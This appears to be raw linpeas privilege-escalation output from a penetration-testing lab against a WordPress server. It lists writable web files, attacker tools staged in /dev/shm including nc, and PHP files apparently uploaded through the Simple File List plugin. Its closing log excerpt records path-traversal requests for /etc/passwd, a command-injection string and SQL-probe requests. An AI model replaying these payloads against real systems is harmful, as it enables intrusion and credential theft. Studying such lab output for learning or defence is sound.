+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_c91aehkmfs1mssa38ib5gsdpqs
+-rw------- 1 http http 0 Jun  5 08:22 /tmp/sess_4dbn4fr1lgif92alvts4g06oof
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/dev/shm/linpeas.sh
+/dev/shm/linpeas.txt
+/dev/shm/lse.sh
+/dev/shm/nc
+/run/faillock/http
+/srv/http
+/srv/http/.gnupg
+/srv/http/.gnupg/pubring.kbx
+/srv/http/.gnupg/trustdb.gpg
+/srv/http/.htaccess
+/srv/http/index.php
+/srv/http/latest.tar.gz
+/srv/http/license.txt
+/srv/http/readme.html
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/about.php
+/srv/http/wp-admin/admin-ajax.php
+/srv/http/wp-admin/admin-footer.php
+/srv/http/wp-admin/admin-functions.php
+/srv/http/wp-admin/admin-header.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/css/about-rtl.css
+/srv/http/wp-admin/css/about-rtl.min.css
+/srv/http/wp-admin/css/about.css
+/srv/http/wp-admin/css/about.min.css
+/srv/http/wp-admin/css/admin-menu-rtl.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/css/colors/_admin.scss
+/srv/http/wp-admin/css/colors/_mixins.scss
+/srv/http/wp-admin/css/colors/_variables.scss
+/srv/http/wp-admin/css/colors/blue
+/srv/http/wp-admin/css/colors/blue/colors-rtl.css
+/srv/http/wp-admin/css/colors/blue/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/blue/colors.css
+/srv/http/wp-admin/css/colors/blue/colors.min.css
+/srv/http/wp-admin/css/colors/blue/colors.scss
+/srv/http/wp-admin/css/colors/coffee
+/srv/http/wp-admin/css/colors/coffee/colors-rtl.css
+/srv/http/wp-admin/css/colors/coffee/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/coffee/colors.css
+/srv/http/wp-admin/css/colors/coffee/colors.min.css
+/srv/http/wp-admin/css/colors/coffee/colors.scss
+/srv/http/wp-admin/css/colors/ectoplasm
+/srv/http/wp-admin/css/colors/ectoplasm/colors-rtl.css
+/srv/http/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/ectoplasm/colors.css
+/srv/http/wp-admin/css/colors/ectoplasm/colors.min.css
+/srv/http/wp-admin/css/colors/ectoplasm/colors.scss
+/srv/http/wp-admin/css/colors/light
+/srv/http/wp-admin/css/colors/light/colors-rtl.css
+/srv/http/wp-admin/css/colors/light/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/light/colors.css
+/srv/http/wp-admin/css/colors/light/colors.min.css
+/srv/http/wp-admin/css/colors/light/colors.scss
+/srv/http/wp-admin/css/colors/midnight
+/srv/http/wp-admin/css/colors/midnight/colors-rtl.css
+/srv/http/wp-admin/css/colors/midnight/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/midnight/colors.css
+/srv/http/wp-admin/css/colors/midnight/colors.min.css
+/srv/http/wp-admin/css/colors/midnight/colors.scss
+/srv/http/wp-admin/css/colors/modern
+/srv/http/wp-admin/css/colors/modern/colors-rtl.css
+/srv/http/wp-admin/css/colors/modern/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/modern/colors.css
+/srv/http/wp-admin/css/colors/modern/colors.min.css
+/srv/http/wp-admin/css/colors/modern/colors.scss
+/srv/http/wp-admin/css/colors/ocean
+/srv/http/wp-admin/css/colors/ocean/colors-rtl.css
+/srv/http/wp-admin/css/colors/ocean/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/ocean/colors.css
+/srv/http/wp-admin/css/colors/ocean/colors.min.css
+/srv/http/wp-admin/css/colors/ocean/colors.scss
+/srv/http/wp-admin/css/colors/sunrise
+/srv/http/wp-admin/css/colors/sunrise/colors-rtl.css
+/srv/http/wp-admin/css/colors/sunrise/colors-rtl.min.css
+/srv/http/wp-admin/css/colors/sunrise/colors.css
+/srv/http/wp-admin/css/colors/sunrise/colors.min.css
+/srv/http/wp-admin/css/colors/sunrise/colors.scss
+/srv/http/wp-admin/css/common-rtl.css
+/srv/http/wp-admin/css/common-rtl.min.css
+/srv/http/wp-admin/css/common.css
+/srv/http/wp-admin/css/common.min.css
+/srv/http/wp-admin/css/customize-controls-rtl.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/custom-background.php
+/srv/http/wp-admin/custom-header.php
+/srv/http/wp-admin/customize.php
+/srv/http/wp-admin/edit-comments.php
+/srv/http/wp-admin/edit-form-advanced.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/includes/admin-filters.php
+/srv/http/wp-admin/includes/admin.php
+/srv/http/wp-admin/includes/ajax-actions.php
+/srv/http/wp-admin/includes/bookmark.php
+/srv/http/wp-admin/includes/class-automatic-upgrader-skin.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/index.php
+/srv/http/wp-admin/install-helper.php
+/srv/http/wp-admin/install.php
+/srv/http/wp-admin/js
+/srv/http/wp-admin/js/accordion.js
+/srv/http/wp-admin/js/accordion.min.js
+/srv/http/wp-admin/js/code-editor.js
+/srv/http/wp-admin/js/code-editor.min.js
+/srv/http/wp-admin/js/color-picker.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/js/widgets/custom-html-widgets.js
+/srv/http/wp-admin/js/widgets/custom-html-widgets.min.js
+/srv/http/wp-admin/js/widgets/media-audio-widget.js
+/srv/http/wp-admin/js/widgets/media-audio-widget.min.js
+/srv/http/wp-admin/js/widgets/media-gallery-widget.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/js/word-count.js
+/srv/http/wp-admin/js/word-count.min.js
+/srv/http/wp-admin/js/xfn.js
+/srv/http/wp-admin/js/xfn.min.js
+/srv/http/wp-admin/link-add.php
+/srv/http/wp-admin/link-manager.php
+/srv/http/wp-admin/link-parse-opml.php
+/srv/http/wp-admin/link.php
+/srv/http/wp-admin/load-scripts.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/maint/repair.php
+/srv/http/wp-admin/media-new.php
+/srv/http/wp-admin/media-upload.php
+/srv/http/wp-admin/media.php
+/srv/http/wp-admin/menu-header.php
+/srv/http/wp-admin/menu.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/network/about.php
+/srv/http/wp-admin/network/admin.php
+/srv/http/wp-admin/network/credits.php
+/srv/http/wp-admin/network/edit.php
+/srv/http/wp-admin/network/freedoms.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/options-discussion.php
+/srv/http/wp-admin/options-general.php
+/srv/http/wp-admin/options-head.php
+/srv/http/wp-admin/options-media.php
+/srv/http/wp-admin/options-permalink.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/user/about.php
+/srv/http/wp-admin/user/admin.php
+/srv/http/wp-admin/user/credits.php
+/srv/http/wp-admin/user/freedoms.php
+/srv/http/wp-admin/user/index.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-admin/users.php
+/srv/http/wp-admin/widgets.php
+/srv/http/wp-blog-header.php
+/srv/http/wp-comments-post.php
+/srv/http/wp-config-sample.php
+/srv/http/wp-config.php
+/srv/http/wp-content
+/srv/http/wp-content/index.php
+/srv/http/wp-content/plugins
+/srv/http/wp-content/plugins/akismet
+/srv/http/wp-content/plugins/akismet/.htaccess
+/srv/http/wp-content/plugins/akismet/LICENSE.txt
+/srv/http/wp-content/plugins/akismet/_inc
+/srv/http/wp-content/plugins/akismet/_inc/akismet.css
+/srv/http/wp-content/plugins/akismet/_inc/akismet.js
+/srv/http/wp-content/plugins/akismet/_inc/form.js
+/srv/http/wp-content/plugins/akismet/_inc/img
+/srv/http/wp-content/plugins/akismet/akismet.php
+/srv/http/wp-content/plugins/akismet/changelog.txt
+/srv/http/wp-content/plugins/akismet/class.akismet-admin.php
+/srv/http/wp-content/plugins/akismet/class.akismet-cli.php
+/srv/http/wp-content/plugins/akismet/class.akismet-rest-api.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/plugins/akismet/views/activate.php
+/srv/http/wp-content/plugins/akismet/views/config.php
+/srv/http/wp-content/plugins/akismet/views/connect-jp.php
+/srv/http/wp-content/plugins/akismet/views/enter.php
+/srv/http/wp-content/plugins/akismet/views/get.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/plugins/akismet/wrapper.php
+/srv/http/wp-content/plugins/hello.php
+/srv/http/wp-content/plugins/index.php
+/srv/http/wp-content/themes
+/srv/http/wp-content/themes/index.php
+/srv/http/wp-content/themes/twentynineteen
+/srv/http/wp-content/themes/twentynineteen/404.php
+/srv/http/wp-content/themes/twentynineteen/archive.php
+/srv/http/wp-content/themes/twentynineteen/classes
+/srv/http/wp-content/themes/twentynineteen/classes/class-twentynineteen-svg-icons.php
+/srv/http/wp-content/themes/twentynineteen/classes/class-twentynineteen-walker-comment.php
+/srv/http/wp-content/themes/twentynineteen/comments.php
+/srv/http/wp-content/themes/twentynineteen/fonts
+/srv/http/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff
+/srv/http/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff2
+/srv/http/wp-content/themes/twentynineteen/footer.php
+/srv/http/wp-content/themes/twentynineteen/functions.php
+/srv/http/wp-content/themes/twentynineteen/header.php
+/srv/http/wp-content/themes/twentynineteen/image.php
+/srv/http/wp-content/themes/twentynineteen/inc
+/srv/http/wp-content/themes/twentynineteen/inc/back-compat.php
+/srv/http/wp-content/themes/twentynineteen/inc/color-patterns.php
+/srv/http/wp-content/themes/twentynineteen/inc/customizer.php
+/srv/http/wp-content/themes/twentynineteen/inc/helper-functions.php
+/srv/http/wp-content/themes/twentynineteen/inc/icon-functions.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentynineteen/index.php
+/srv/http/wp-content/themes/twentynineteen/js
+/srv/http/wp-content/themes/twentynineteen/js/customize-controls.js
+/srv/http/wp-content/themes/twentynineteen/js/customize-preview.js
+/srv/http/wp-content/themes/twentynineteen/js/priority-menu.js
+/srv/http/wp-content/themes/twentynineteen/js/skip-link-focus-fix.js
+/srv/http/wp-content/themes/twentynineteen/js/touch-keyboard-navigation.js
+/srv/http/wp-content/themes/twentynineteen/package-lock.json
+/srv/http/wp-content/themes/twentynineteen/package.json
+/srv/http/wp-content/themes/twentynineteen/page.php
+/srv/http/wp-content/themes/twentynineteen/postcss.config.js
+/srv/http/wp-content/themes/twentynineteen/print.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentynineteen/sass/_normalize.scss
+/srv/http/wp-content/themes/twentynineteen/sass/blocks
+/srv/http/wp-content/themes/twentynineteen/sass/blocks/_blocks.scss
+/srv/http/wp-content/themes/twentynineteen/sass/elements
+/srv/http/wp-content/themes/twentynineteen/sass/elements/_elements.scss
+/srv/http/wp-content/themes/twentynineteen/sass/elements/_lists.scss
+/srv/http/wp-content/themes/twentynineteen/sass/elements/_tables.scss
+/srv/http/wp-content/themes/twentynineteen/sass/forms
+/srv/http/wp-content/themes/twentynineteen/sass/forms/_buttons.scss
+/srv/http/wp-content/themes/twentynineteen/sass/forms/_fields.scss
+/srv/http/wp-content/themes/twentynineteen/sass/forms/_forms.scss
+/srv/http/wp-content/themes/twentynineteen/sass/layout
+/srv/http/wp-content/themes/twentynineteen/sass/layout/_layout.scss
+/srv/http/wp-content/themes/twentynineteen/sass/media
+/srv/http/wp-content/themes/twentynineteen/sass/media/_captions.scss
+/srv/http/wp-content/themes/twentynineteen/sass/media/_galleries.scss
+/srv/http/wp-content/themes/twentynineteen/sass/media/_media.scss
+/srv/http/wp-content/themes/twentynineteen/sass/mixins
+/srv/http/wp-content/themes/twentynineteen/sass/mixins/_mixins-master.scss
+/srv/http/wp-content/themes/twentynineteen/sass/mixins/_utilities.scss
+/srv/http/wp-content/themes/twentynineteen/sass/modules
+/srv/http/wp-content/themes/twentynineteen/sass/modules/_accessibility.scss
+/srv/http/wp-content/themes/twentynineteen/sass/modules/_alignments.scss
+/srv/http/wp-content/themes/twentynineteen/sass/modules/_clearings.scss
+/srv/http/wp-content/themes/twentynineteen/sass/navigation
+/srv/http/wp-content/themes/twentynineteen/sass/navigation/_links.scss
+/srv/http/wp-content/themes/twentynineteen/sass/navigation/_menu-footer-navigation.scss
+/srv/http/wp-content/themes/twentynineteen/sass/navigation/_menu-main-navigation.scss
+/srv/http/wp-content/themes/twentynineteen/sass/navigation/_menu-social-navigation.scss
+/srv/http/wp-content/themes/twentynineteen/sass/navigation/_navigation.scss
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentynineteen/sass/site
+/srv/http/wp-content/themes/twentynineteen/sass/site/_site.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/footer
+/srv/http/wp-content/themes/twentynineteen/sass/site/footer/_site-footer.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/header
+/srv/http/wp-content/themes/twentynineteen/sass/site/header/_site-featured-image.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/header/_site-header.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/primary
+/srv/http/wp-content/themes/twentynineteen/sass/site/primary/_archives.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/primary/_comments.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/primary/_posts-and-pages.scss
+/srv/http/wp-content/themes/twentynineteen/sass/site/secondary
+/srv/http/wp-content/themes/twentynineteen/sass/site/secondary/_widgets.scss
+/srv/http/wp-content/themes/twentynineteen/sass/typography
+/srv/http/wp-content/themes/twentynineteen/sass/typography/_copy.scss
+/srv/http/wp-content/themes/twentynineteen/sass/typography/_headings.scss
+/srv/http/wp-content/themes/twentynineteen/sass/typography/_typography.scss
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site/_colors.scss
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site/_columns.scss
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site/_fonts.scss
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site/_structure.scss
+/srv/http/wp-content/themes/twentynineteen/sass/variables-site/_transitions.scss
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentynineteen/search.php
+/srv/http/wp-content/themes/twentynineteen/single.php
+/srv/http/wp-content/themes/twentynineteen/style-editor-customizer.css
+/srv/http/wp-content/themes/twentynineteen/style-editor-customizer.scss
+/srv/http/wp-content/themes/twentynineteen/style-editor.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentynineteen/template-parts/content
+/srv/http/wp-content/themes/twentynineteen/template-parts/content/content-excerpt.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/content/content-none.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/content/content-page.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/content/content-single.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/content/content.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/footer
+/srv/http/wp-content/themes/twentynineteen/template-parts/footer/footer-widgets.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/header
+/srv/http/wp-content/themes/twentynineteen/template-parts/header/entry-header.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/header/site-branding.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/post
+/srv/http/wp-content/themes/twentynineteen/template-parts/post/author-bio.php
+/srv/http/wp-content/themes/twentynineteen/template-parts/post/discussion-meta.php
+/srv/http/wp-content/themes/twentyseventeen
+/srv/http/wp-content/themes/twentyseventeen/404.php
+/srv/http/wp-content/themes/twentyseventeen/archive.php
+/srv/http/wp-content/themes/twentyseventeen/assets
+/srv/http/wp-content/themes/twentyseventeen/assets/css
+/srv/http/wp-content/themes/twentyseventeen/assets/css/blocks.css
+/srv/http/wp-content/themes/twentyseventeen/assets/css/colors-dark.css
+/srv/http/wp-content/themes/twentyseventeen/assets/css/editor-blocks.css
+/srv/http/wp-content/themes/twentyseventeen/assets/css/editor-style.css
+/srv/http/wp-content/themes/twentyseventeen/assets/css/ie8.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentyseventeen/assets/images
+/srv/http/wp-content/themes/twentyseventeen/assets/js
+/srv/http/wp-content/themes/twentyseventeen/assets/js/customize-controls.js
+/srv/http/wp-content/themes/twentyseventeen/assets/js/customize-preview.js
+/srv/http/wp-content/themes/twentyseventeen/assets/js/global.js
+/srv/http/wp-content/themes/twentyseventeen/assets/js/html5.js
+/srv/http/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentyseventeen/comments.php
+/srv/http/wp-content/themes/twentyseventeen/footer.php
+/srv/http/wp-content/themes/twentyseventeen/front-page.php
+/srv/http/wp-content/themes/twentyseventeen/functions.php
+/srv/http/wp-content/themes/twentyseventeen/header.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentyseventeen/inc/back-compat.php
+/srv/http/wp-content/themes/twentyseventeen/inc/color-patterns.php
+/srv/http/wp-content/themes/twentyseventeen/inc/custom-header.php
+/srv/http/wp-content/themes/twentyseventeen/inc/customizer.php
+/srv/http/wp-content/themes/twentyseventeen/inc/icon-functions.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentyseventeen/index.php
+/srv/http/wp-content/themes/twentyseventeen/page.php
+/srv/http/wp-content/themes/twentyseventeen/readme.txt
+/srv/http/wp-content/themes/twentyseventeen/rtl.css
+/srv/http/wp-content/themes/twentyseventeen/search.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentyseventeen/template-parts/footer
+/srv/http/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/header
+/srv/http/wp-content/themes/twentyseventeen/template-parts/header/header-image.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/navigation
+/srv/http/wp-content/themes/twentyseventeen/template-parts/navigation/navigation-top.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/page
+/srv/http/wp-content/themes/twentyseventeen/template-parts/page/content-front-page-panels.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/page/content-front-page.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/page/content-page.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post/content-audio.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post/content-excerpt.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post/content-gallery.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post/content-image.php
+/srv/http/wp-content/themes/twentyseventeen/template-parts/post/content-none.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentytwenty
+/srv/http/wp-content/themes/twentytwenty/.stylelintrc.json
+/srv/http/wp-content/themes/twentytwenty/404.php
+/srv/http/wp-content/themes/twentytwenty/assets
+/srv/http/wp-content/themes/twentytwenty/assets/css
+/srv/http/wp-content/themes/twentytwenty/assets/css/editor-style-block-rtl.css
+/srv/http/wp-content/themes/twentytwenty/assets/css/editor-style-block.css
+/srv/http/wp-content/themes/twentytwenty/assets/css/editor-style-classic-rtl.css
+/srv/http/wp-content/themes/twentytwenty/assets/css/editor-style-classic.css
+/srv/http/wp-content/themes/twentytwenty/assets/fonts
+/srv/http/wp-content/themes/twentytwenty/assets/fonts/inter
+/srv/http/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2
+/srv/http/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2
+/srv/http/wp-content/themes/twentytwenty/assets/images
+/srv/http/wp-content/themes/twentytwenty/assets/js
+/srv/http/wp-content/themes/twentytwenty/assets/js/color-calculations.js
+/srv/http/wp-content/themes/twentytwenty/assets/js/customize-controls.js
+/srv/http/wp-content/themes/twentytwenty/assets/js/customize-preview.js
+/srv/http/wp-content/themes/twentytwenty/assets/js/customize.js
+/srv/http/wp-content/themes/twentytwenty/assets/js/editor-script-block.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentytwenty/classes
+/srv/http/wp-content/themes/twentytwenty/classes/class-twentytwenty-customize.php
+/srv/http/wp-content/themes/twentytwenty/classes/class-twentytwenty-non-latin-languages.php
+/srv/http/wp-content/themes/twentytwenty/classes/class-twentytwenty-script-loader.php
+/srv/http/wp-content/themes/twentytwenty/classes/class-twentytwenty-separator-control.php
+/srv/http/wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentytwenty/comments.php
+/srv/http/wp-content/themes/twentytwenty/footer.php
+/srv/http/wp-content/themes/twentytwenty/functions.php
+/srv/http/wp-content/themes/twentytwenty/header.php
+/srv/http/wp-content/themes/twentytwenty/inc
+/srv/http/wp-content/themes/twentytwenty/inc/custom-css.php
+/srv/http/wp-content/themes/twentytwenty/inc/starter-content.php
+/srv/http/wp-content/themes/twentytwenty/inc/svg-icons.php
+/srv/http/wp-content/themes/twentytwenty/inc/template-tags.php
+/srv/http/wp-content/themes/twentytwenty/index.php
+/srv/http/wp-content/themes/twentytwenty/package-lock.json
+/srv/http/wp-content/themes/twentytwenty/package.json
+/srv/http/wp-content/themes/twentytwenty/print.css
+/srv/http/wp-content/themes/twentytwenty/readme.txt
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentytwenty/template-parts/content-cover.php
+/srv/http/wp-content/themes/twentytwenty/template-parts/content.php
+/srv/http/wp-content/themes/twentytwenty/template-parts/entry-author-bio.php
+/srv/http/wp-content/themes/twentytwenty/template-parts/entry-header.php
+/srv/http/wp-content/themes/twentytwenty/template-parts/featured-image.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-content/themes/twentytwenty/templates
+/srv/http/wp-content/themes/twentytwenty/templates/template-cover.php
+/srv/http/wp-content/themes/twentytwenty/templates/template-full-width.php
+/srv/http/wp-content/uploads
+/srv/http/wp-content/uploads/2020
+/srv/http/wp-content/uploads/2020/09
+/srv/http/wp-content/uploads/2020/10
+/srv/http/wp-content/uploads/2021
+/srv/http/wp-content/uploads/2021/06
+/srv/http/wp-content/uploads/simple-file-list
+/srv/http/wp-content/uploads/simple-file-list/6728.php
+/srv/http/wp-content/uploads/simple-file-list/8643.php
+/srv/http/wp-content/uploads/simple-file-list/index.html
+/srv/http/wp-cron.php
+/srv/http/wp-includes
+/srv/http/wp-includes/ID3
+/srv/http/wp-includes/ID3/getid3.lib.php
+/srv/http/wp-includes/ID3/getid3.php
+/srv/http/wp-includes/ID3/license.commercial.txt
+/srv/http/wp-includes/ID3/license.txt
+/srv/http/wp-includes/ID3/module.audio-video.asf.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-includes/IXR
+/srv/http/wp-includes/IXR/class-IXR-base64.php
+/srv/http/wp-includes/IXR/class-IXR-client.php
+/srv/http/wp-includes/IXR/class-IXR-clientmulticall.php
+/srv/http/wp-includes/IXR/class-IXR-date.php
+/srv/http/wp-includes/IXR/class-IXR-error.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-includes/PHPMailer
+/srv/http/wp-includes/PHPMailer/Exception.php
+/srv/http/wp-includes/PHPMailer/PHPMailer.php
+/srv/http/wp-includes/PHPMailer/SMTP.php
+/srv/http/wp-includes/Requests
+/srv/http/wp-includes/Requests/Auth
+/srv/http/wp-includes/Requests/Auth.php
+/srv/http/wp-includes/Requests/Auth/Basic.php
+/srv/http/wp-includes/Requests/Cookie
+/srv/http/wp-includes/Requests/Cookie.php
+/srv/http/wp-includes/Requests/Cookie/Jar.php
+/srv/http/wp-includes/Requests/Exception
+/srv/http/wp-includes/Requests/Exception.php
+/srv/http/wp-includes/Requests/Exception/HTTP
+/srv/http/wp-includes/Requests/Exception/HTTP.php
+/srv/http/wp-includes/Requests/Exception/HTTP/304.php
+/srv/http/wp-includes/Requests/Exception/HTTP/305.php
+/srv/http/wp-includes/Requests/Exception/HTTP/306.php
+/srv/http/wp-includes/Requests/Exception/HTTP/400.php
+/srv/http/wp-includes/Requests/Exception/HTTP/401.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-includes/Requests/Exception/Transport
+/srv/http/wp-includes/Requests/Exception/Transport.php
+/srv/http/wp-includes/Requests/Exception/Transport/cURL.php
+/srv/http/wp-includes/Requests/Hooker.php
+/srv/http/wp-includes/Requests/Hooks.php
+/srv/http/wp-includes/Requests/IDNAEncoder.php
+/srv/http/wp-includes/Requests/IPv6.php
+/srv/http/wp-includes/Requests/IRI.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/srv/http/wp-includes/Requests/Proxy/HTTP.php
+/srv/http/wp-includes/Requests/Response
+/srv/http/wp-includes/Requests/Response.php
+/srv/http/wp-includes/Requests/Response/Headers.php
+/srv/http/wp-includes/Requests/SSL.php
+/srv/http/wp-includes/Requests/Session.php
+/srv/http/wp-includes/Requests/Transport
+/srv/http/wp-includes/Requests/Transport.php
+/srv/http/wp-includes/Requests/Transport/cURL.php
+/srv/http/wp-includes/Requests/Transport/fsockopen.php
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group http:
+/run/faillock/http
+
+[+] Searching passwords in config PHP files
+
+[+] Checking for TTY (sudo/su) passwords in audit logs
+
+[+] Finding IPs inside logs (limit 70)
+2508251 192.168.49.169
+    236 192.168.169.105
+      3 192.168.1.1
+      2 255.255.255.255
+      2 10.10.10.10
+      2 0.9.6.2
+
+[+] Finding passwords inside logs (limit 70)
+192.168.49.169 - - [05/Jun/2021:08:22:24 +0000] "GET %2F%2Fetc%2Fpasswd HTTP/1.1" 404 990
+192.168.49.169 - - [05/Jun/2021:08:22:25 +0000] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:22:26 +0000] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:22:30 +0000] "GET /?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 22268
+192.168.49.169 - - [05/Jun/2021:08:22:34 +0000] "HEAD /piranha/secure/passwd.php3 HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:08:22:34 +0000] "HEAD /setup/password_required.html HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:08:22:35 +0000] "HEAD /officescan/console/html/cgi/cgiChkMasterPwd.exe HTTP/1.1" 404 -
+192.168.49.169 - - [05/Jun/2021:08:22:37 +0000] "GET /../../../../../../../etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:22:39 +0000] "GET /.htpasswd HTTP/1.1" 403 980
+192.168.49.169 - - [05/Jun/2021:08:22:52 +0000] "GET %2F%2Fetc%2Fpasswd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:23:05 +0000] "GET /../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
+192.168.49.169 - - [05/Jun/2021:08:23:18 +0000] "GET /?parameter=../../../etc/passwd HTTP/1.1" 200 22268
+192.168.49.169 - - [05/Jun/2021:08:23:39 +0000] "GET http://192.168.169.105:80/wp-login.php?action=lostpassword%27%20OR%20sqlspider HTTP/1.1" 200 6193
+192.168.49.169 - - [05/Jun/2021:08:29:23 +0000] "GET /DomainFiles/*//../../../../../../../../../../etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:29:25 +0000] "GET /index.php?download=/etc/passwd HTTP/1.1" 301 -
+192.168.49.169 - - [05/Jun/2021:08:29:26 +0000] "GET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1" 301 -
+192.168.49.169 - - [05/Jun/2021:08:29:26 +0000] "GET /index.php?|=../../../../../../../../../etc/passwd HTTP/1.1" 301 -
+192.168.49.169 - - [05/Jun/2021:08:29:27 +0000] "GET /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd HTTP/1.1" 301 -
+192.168.49.169 - - [05/Jun/2021:08:29:34 +0000] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:29:35 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:30:47 +0000] "GET /cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download" 400 934
+192.168.49.169 - - [05/Jun/2021:08:32:58 +0000] "GET ../../../../../../../../../../etc/passw* HTTP/1.1" 400 923
+192.168.49.169 - - [05/Jun/2021:08:36:49 +0000] "GET /.htpasswd HTTP/1.1" 403 980
+192.168.49.169 - - [05/Jun/2021:08:36:54 +0000] "GET ////////../../../../../../etc/passwd HTTP/1.1" 400 923
